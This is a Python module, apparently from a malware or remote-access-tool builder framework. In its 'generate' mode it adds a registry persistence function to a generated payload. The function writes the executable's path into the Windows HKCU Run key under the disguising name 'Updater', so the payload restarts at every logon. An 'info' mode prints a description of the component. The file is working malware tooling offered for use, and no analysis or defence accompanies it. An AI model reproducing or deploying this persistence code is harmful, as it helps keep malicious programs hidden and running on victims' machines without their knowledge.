# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('import winreg')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from os import getcwd, path')
        config.startup.append('registry_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
        config.functions.append('''
def registry_persist_startup(path):
    reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    key = winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,winreg.KEY_WRITE)
    winreg.SetValueEx(key, 'Updater',0,winreg.REG_SZ, path)
    winreg.FlushKey(key)
    winreg.CloseKey(key)
    winreg.CloseKey(reg)
''')
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Registry Persistence startup component",
                "OS": "Windows",
                "Required Modules": "winreg, sys, os",
                "Commands": "NIL (Runs at startup)",
                "Description": "This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path"}
        elif interface == "CUI":
            print('\nName             : Registry Persistence startup component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : winreg, sys, os' \
                  '\nCommands         : NIL (Runs at startup)' \
                  '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path\n')
